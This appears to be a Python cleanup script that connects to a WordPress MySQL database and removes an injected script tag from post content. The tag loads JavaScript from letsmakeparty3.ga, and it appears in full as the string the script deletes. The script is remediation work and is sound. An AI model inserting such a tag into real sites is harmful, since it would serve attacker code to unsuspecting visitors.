#!/usr/bin/python3
# requirements:
# python -m pip install mysql-connector-python

import re, sys, mysql.connector
from mysql.connector import Error

# import detection regex & constants from constant.py file
from config import *


if (DB_NAME == '' or DB_HOST == '' or DB_USER == '' or DB_PASSWORD == ''):
    print("\n /!\ NO DATABASE CREDS \n Open the 'config.py' file and please provide the WordPress database credentials\n You can find them in the wp-config.php file\n")
    exit(0)

print("/!\ Be safe & make a backup before !")
k = input("Write 'yes' to continue: ")
if k != "yes":
    print("Ok bye !")
    exit(0)

CLEANED_POSTS = 0
try:
    # connect to MySQL DB
    conn = mysql.connector.connect(host=DB_HOST, user=DB_USER, password=DB_PASSWORD, database=DB_NAME)
    cur = conn.cursor()
except Error as e:
    print("MySQL connection error: ",e)
    exit(1)


try:
    # Search POSTS table as the virus 
    cur.execute("SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE `TABLE_NAME` LIKE '%post%'")
    rows = cur.fetchall()
    for row in rows:
        TABLE_SCHEMA = row[0]
        TABLE_NAME = row[1]

        # Check the presence of the infected column
        cur.execute("SHOW COLUMNS FROM "+TABLE_SCHEMA+"."+TABLE_NAME+" LIKE 'post_content'");
        if (cur.fetchall() != []):

            # Select all posts content
            cur.execute("SELECT post_content FROM "+TABLE_SCHEMA+"."+TABLE_NAME)
            posts = cur.fetchall()
            for post in posts:
                # Delete the payload if infected
                if bool(re.search(regex, post[0], flags = re.M)):
                    cur.execute("UPDATE "+TABLE_SCHEMA+"."+TABLE_NAME+" set post_content = REPLACE(post_content,\"<script src='https://letsmakeparty3.ga/l.js?qs=1' type='text/javascript'></script>\",\"\") WHERE post_content LIKE '%letsmakeparty3%'")
                    CLEANED_POSTS += 1

except Error as e:
    print("MySQL Error : ",e)
    sys.exit(1)

finally:
    if (conn.is_connected()):
        cur.close()
        conn.close()

print("")
print( "> {} cleaned articles".format(CLEANED_POSTS))

